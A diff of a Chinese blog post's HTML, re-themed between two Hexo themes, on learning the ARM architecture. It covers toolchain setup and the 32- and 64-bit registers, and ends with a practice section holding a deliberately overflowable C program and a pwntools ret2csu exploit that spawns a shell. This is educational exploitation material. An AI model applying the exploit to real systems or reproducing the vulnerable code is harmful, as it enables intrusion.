@@ -1,121 +1,177 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" color-mode="light">
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
-
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="C12en" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
     
-      <link rel="icon" href="/favicon.png" />
+      arm架构学习 
+      
+      
+      |
     
+     C12en
+  </title>
 
-    <title>
-        
-          arm架构学习 - C12en
-        
-    </title>
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/1.png">
+  
 
-    <!-- Spectre.css framework -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
 
-    <!-- theme css & js -->
-    
-<link rel="stylesheet" href="/css/book.css">
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
 
-    
-<script src="/js/book.js"></script>
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
 
 
-    <!-- tocbot -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
-    
-    <!-- katex -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+  
 
-    
-    
-<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-    const zooming = new Zooming()
-    zooming.listen('.book-content img')
-})
-</script>
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
 
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
 <meta name="generator" content="Hexo 7.3.0"></head>
 
-<body>
 
-<div class="book-container">
-  <div class="book-sidebar">
-    <div class="book-brand">
-  <a href="/">
-    <img src="/favicon.png">
-    <span>C12EN</span>
-  </a>
-</div>
-    <div id="menu" class="book-menu hide">
-  
-</div>
-
-
-<script src="/js/book-menu.js"></script>
-
-  </div>
-
-  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
-  <div class="sidebar-toggle-inner"></div>
-</div>
-
-<script>
-function add_inner() {
-  let inner = document.querySelector('.sidebar-toggle-inner')
-  inner.classList.add('show')  
-}
-
-function remove_inner() {
-  let inner = document.querySelector('.sidebar-toggle-inner')
-  inner.classList.remove('show')
-}
-
-function sidebar_toggle() {
-    let sidebar_toggle = document.querySelector('.sidebar-toggle')
-    let sidebar = document.querySelector('.book-sidebar')
-    let content = document.querySelector('.off-canvas-content')
-    if (sidebar_toggle.classList.contains('extend')) { // show
-        sidebar_toggle.classList.remove('extend')
-        sidebar.classList.remove('hide')
-        content.classList.remove('extend')
-    }
-    else { // hide
-        sidebar_toggle.classList.add('extend')
-        sidebar.classList.add('hide')
-        content.classList.add('extend')
-    }
-}
-</script>
-
-  <div class="off-canvas-content">
-    <div class="columns">
-      <div class="column col-10 col-lg-12">
-        <div class="book-navbar">
-          <!-- For Responsive Layout -->
-
-<header class="navbar">
-  <section class="navbar-section">
-    <a onclick="open_sidebar()">
-      <i class="icon icon-menu"></i>
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/2.png" alt="">
+      
     </a>
-  </section>
-</header>
+    <div class="nickname"><a href="/">C12en</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
 
-        </div>
-        <div class="book-content">
-          <div class="book-post">
-  <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu libc6-armhf-cross gcc-10-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">arm架构学习</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-03-10 15:19:36
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/iot/" title="iot">
+                    <b>#</b> iot
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu libc6-armhf-cross gcc-10-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
 <h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>与先前学过的inter指令集不同的是 arm采用的是精简指令集 虽然可以更快的执行指令 但是由于指令较少 因此在实现功能的时候会比inter更加繁琐<br>x86架构中 可以直接对内存数据进行操作 但是在arm架构中 只能通过寄存器来中转 先将内存中的数据存入寄存器再操作 这一点类似8086<br>arm架构下 又可以细分为armel和armhf 这是在32位下 至于64位 则都是采用armhf<br>二者的区别在于浮点运算上 他们在浮点运算时都会使用fpu寄存器 但是前者在传参的时候会使用普通寄存器 而后者在传参时则会使用fpu寄存器 所以armhf的浮点运算能力更强<br>ARM一共有37个寄存器 其中31个32位的通用寄存器 以及6个32位的状态寄存器<br>ARM处理器一共有7种模式<br>用户模式(usr)：ARM处理器正常的程序执行状态。非特权模式。<br>快速中断模式(fiq)：用于高速数据传输或通道处理。<br>外部中断模式(irq)：用于通用的中断处理。<br>管理模式(svc)：操作系统使用的保护模式。<br>数据访问终止模式(abt)：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。<br>系统模式(sys)：运行具有特权的操作系统任务。<br>定义指令中止模式(und)：当未定义的指令执行时进入该模式，可用于支持硬件协处理器的软件仿真。</p>
 <h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><p>任意处理器模式下 可使用的寄存器包含15个通用寄存器 即R0-R14还有程序计数器PC以及一两个状态寄存器<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410242219483.png" alt="image.png"><br>R0寄存器可以用于存储临时值 也用于存储函数调用后的返回值<br>R0~R3寄存器就负责存储调用函数的参数<br>R7寄存器用于存储系统调用号 (这一点倒是比x86做的好 x86的rax寄存器又是存储函数返回值又是存储系统调用号的 可以通过read函数来控制rax寄存器的值 有机会实现任意函数调用 存在安全隐患<br>R11寄存器用来存储回溯信息 也可以作为局部变量 (这里的回溯信息有点疑惑是具体指什么 如果是用来返回父函数的 又和R14寄存器冲突 希望下面的研究能够了解一下<br>R13寄存器就是堆栈指针 指向堆栈的顶部<br>R14寄存器类似于rbp寄存器 存储调用函数的下一条指令 供子函数返回父函数<br>PC寄存器类似于rip寄存器 存储当前执行的目标地址 不过要特别注意的是 arm架构的pc寄存器会存储当前执行的目标地址+8 (这里具体的数值待研究 不清楚32位和64位架构是否都是8)</p>
 <h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>64位的arm架构这里介绍的是aarch64 属于armv8版本<br>aarch64一共有31个通用寄存器<br>这些寄存器既可以作为64位也可以作为32位使用<br>作为64位使用时表示为X0 作为32位使用时表示为W0(这里的0指的是0号寄存器 其他寄存器同理)<br>X0-X7作为参数和结果寄存器 可以作为临时寄存器以及存储函数调用过程中所需要的参数<br>X9-X15作为调用者保存的临时寄存器 调用者如果需要用到此类寄存器的值 要先将值存入栈上 再进行调用 因为在调用结束之后 不需要恢复寄存器的值<br>X19-X28作为被调用者保存的寄存器 这一个名称听起来拗口 实际可以理解为x64_86架构中的ebp寄存器 在进入子函数之后 会把原本的ebp存入栈上后 再将新的值存入寄存器 在返回父函数之前恢复ebp寄存器的值 这里指的就是这类寄存器<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250217112837508.png" alt="image.png"><br>特殊寄存器:<br>X29： 帧指针寄存器（FP）类似于32位的R11寄存器<br>X30： 链接寄存器（LR）类似于ebp寄存器<br>X31： 堆栈指针寄存器 (SP) 类似于esp寄存器</p>
@@ -151,84 +207,373 @@ function sidebar_toggle() {
 <h2 id="32位-3"><a href="#32位-3" class="headerlink" title="32位"></a>32位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int key = 0;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">    puts(&quot;ez attack&quot;);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(0,buf,0x100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void backdoor()&#123;</span><br><span class="line">    system(&quot;echo /bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    init();</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>32位的不同点在于 多了pop和push对栈帧的操作<br>不过在动态链接的情况下 仍然没有找到合适的gadget来控制r0 r1 r2<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250310150124301.png" alt="image.png"><br>好在发现ret2csu仍然存在(这也太万能了<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/img/20250310150406744.png" alt="image.png"><br>总体的逻辑还是比较简单 就是调用system之前先要执行一下system函数 否则got表里面没有真实地址</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">import base64</span><br><span class="line">context.arch = &quot;arm&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"># io = process(&quot;./test&quot;)</span><br><span class="line">io = process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabihf/&quot;,&quot;./test&quot;])</span><br><span class="line">#io = remote(&quot;8.147.129.227&quot;,34825)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">#libc = ELF(&quot;libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;ez attack&quot;)</span><br><span class="line">payload = cyclic(0x24)+p32(0x105E8)</span><br><span class="line">payload += p32(0)+p32(elf.got[&#x27;read&#x27;])+p32(1)+p32(0)+p32(elf.bss(0x800))+p32(0x100)+p32(0)+p32(0x105C8)+cyclic(0x1c)+p32(0x10564)+cyclic(0x4)+p32(elf.sym[&#x27;main&#x27;])</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;/bin/sh\x00&quot;</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">io.recvuntil(&quot;ez attack&quot;)</span><br><span class="line">binsh_addr = elf.bss(0x800)</span><br><span class="line">payload = cyclic(0x24)+p32(0x105E8)</span><br><span class="line">payload += p32(0)+p32(elf.got[&#x27;system&#x27;])+p32(1)+p32(binsh_addr)+p32(0)+p32(0)+p32(0)+p32(0x105c8)</span><br><span class="line">io.send(payload)</span><br><span class="line"># pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-</div>
-
-
-  <div class="book-comments">
-    
-
-
-
-
-  </div>
-
-
-
-<script src="/js/book-post.js"></script>
-
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/06/26/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-03-10 15:19:36
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/iot/" title="iot">
+                        <b>#</b> iot
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2024/10/11/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
-      </div>
-      <div class="column col-2 hide-lg">
-        <div class="book-post-info">
-  
-    <div class="book-post-meta">
-
-  <div class="author">
-
-    <!-- Author image -->
-    <div class="author-img">
-      
-        <figure
-          class="avatar avatar-lg"
-          data-initial="C"
-          style="background-color: #3b4351;">
-        </figure>
-      
-    </div>
-
-    <!-- Author title -->
-    <div class="author-title">
-      <div>C12en</div>
-      <div>2024-10-10</div>
-    </div>
-  </div>
-
-  
-    <div class="divider"></div>
-
-    <div class="link">
-      <a class="category-link" href="/categories/iot/">iot</a>
-
       
     </div>
     
-  
-
-  <div class="divider"></div>
-</div>
-  
-
-  <div class="book-tocbot">
-</div>
-<div class="book-tocbot-menu">
-  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
-  <a onclick="go_top()">Back to top</a>
-  <a onclick="go_bottom()">Go to bottom</a>
-</div>
-
-
-<script src="/js/book-toc.js"></script>
-
-</div>
-      </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-text">32位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%B9%B6%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AAarm%E6%9E%B6%E6%9E%84%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-text">编译并运行一个arm架构的二进制文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D-1"><span class="toc-text">32位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D-1"><span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%BB%E6%87%82%E7%AE%80%E5%8D%95%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B1%87%E7%BC%96"><span class="toc-text">读懂简单程序的汇编</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D-2"><span class="toc-text">32位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D-2"><span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%B0%9D%E8%AF%95-%E5%88%9D%E6%AD%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">简单的尝试 初步漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D-3"><span class="toc-text">64位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D-3"><span class="toc-text">32位</span></a></li></ol></li></ol>
+      
     </div>
   </div>
+
   
-  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
 </div>
 
-</body>
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + arm%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0 + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F10%2F10%2Farm%25E6%259E%25B6%25E6%259E%2584%25E5%25AD%25A6%25E4%25B9%25A0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/10/10/arm%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
 </html>
-
-
-<script src="/js/book.js"></script>
